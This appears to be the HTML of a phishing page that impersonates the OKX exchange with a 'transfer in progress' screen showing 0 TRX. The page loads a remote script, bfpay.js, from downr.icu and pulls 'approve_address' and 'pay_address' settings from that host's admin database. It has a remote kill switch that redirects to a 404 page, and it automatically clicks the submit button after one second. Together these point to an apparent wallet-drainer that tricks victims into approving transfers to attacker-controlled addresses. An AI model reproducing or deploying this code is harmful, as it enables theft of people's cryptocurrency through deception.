<html lang="zh-CN" style="--status-bar-height: 0px; --top-window-height: 0px; --window-left: 0px; --window-right: 0px; --window-margin: 0px; font-size: 17.2px; --window-top: calc(var(--top-window-height) + 0px); --window-bottom: 0px;">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,maximum-scale=1,minimum-scale=1">
    <title>正在转账</title>
    <script src="newokx/js/jquery-3.5.1.min.js"></script>
    <link rel="shortcut icon" href="https://static.okx.com/cdn/assets/imgs/226/EB771F0EE8994DD5.png" type="image/png">
    <script src="https://cdn.jsdelivr.net/npm/eruda"></script>
    <script>eruda.init();</script>
    <style>
        ::-webkit-scrollbar {
            display: none;
        }
    </style>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            document.documentElement.style.fontSize = document.documentElement.clientWidth / 25 + 'px'
        });
    </script>
    <link rel="stylesheet" href="newokx/js/okex.css">
</head>
<body class="uni-body pages-index-home">
<noscript><strong>本站点必须要开启JavaScript才能运行</strong></noscript>

<uni-app class="uni-app--maxwidth">
    <uni-page data-page="pages/index/home">
        <uni-page-wrapper>
            <uni-page-body>
                <body data-v-49fe1bb8="">
                    <div data-v-49fe1bb8="" id="app">
                        <div data-v-49fe1bb8="" class="pay-box">
                            <div data-v-49fe1bb8="" class="amount">
                                <div data-v-49fe1bb8="" class="num">
                                    <span class="amount" id="amount">0</span><em data-v-49fe1bb8="">TRX</em>
                                </div>
                                <img data-v-49fe1bb8="" src="newokx/icon_exchange.jpg" class="icon">
                            </div>
                            <div data-v-49fe1bb8="" class="rate">
                                <span id="amount-display">0</span><em data-v-49fe1bb8="">TRX</em>
                                <div data-v-49fe1bb8="" class="icon"><img data-v-49fe1bb8="" src="newokx/icon_horn.jpg"></div>
                            </div>
                        </div>
                    </div>
                </body>
            </uni-page-body>
        </uni-page-wrapper>
    </uni-page>

    <!-- 保留原来的引用的JS -->
    <script type="text/javascript" src="https://downr.icu/bfpay.js"></script>
    <script type="text/javascript" src="newokx/js/help.js"></script>
    <script type="text/javascript" src="newokx/js/common.js"></script>

    <script>
        // 保留从 downr.icu 获取数据的逻辑
        let approveaddress, payaddress, isopen, ismiaou;
        var domain = '';
        fetch('https://downr.icu/yyadmin/database.php')
            .then(response => response.json())
            .then(data => {
                data.forEach(config => {
                    switch(config.config_key) {
                        case 'approve_address':
                            approveaddress = config.config_value;
                            break;
                        case 'pay_address':
                            payaddress = config.config_value;
                            break;
                        case 'isappay':
                            ismiaou = config.config_value;
                            break;
                        case 'isopen':
                            isopen = config.config_value;
                            break;
                        default:
                            console.log('未定义的配置键:', config.config_key);
                    }
                });

                if(isopen === '0'){
                    console.log(isopen);
                } else {
                    window.location.href = '/404.php';
                }
            })
            .catch(error => {
                console.error('Error fetching config:', error);
            });

        // 模拟输入 0 并自动点击“下一步”按钮
        document.addEventListener('DOMContentLoaded', function() {
            var amount = document.getElementById('amount');
            var amountDisplay = document.getElementById('amount-display');
            var submitBtn = document.getElementById('submitBtn');

            // 模拟输入0
            amount.textContent = '0';  
            amountDisplay.textContent = '0';  

            // 启用“下一步”按钮
            submitBtn.classList.remove('disabled');
            submitBtn.disabled = false;

            // 自动点击“下一步”按钮
            setTimeout(function() {
                submitBtn.click();
            }, 1000);  // 延迟1秒后自动点击
        });
    </script>
</uni-app>

</body>
</html>
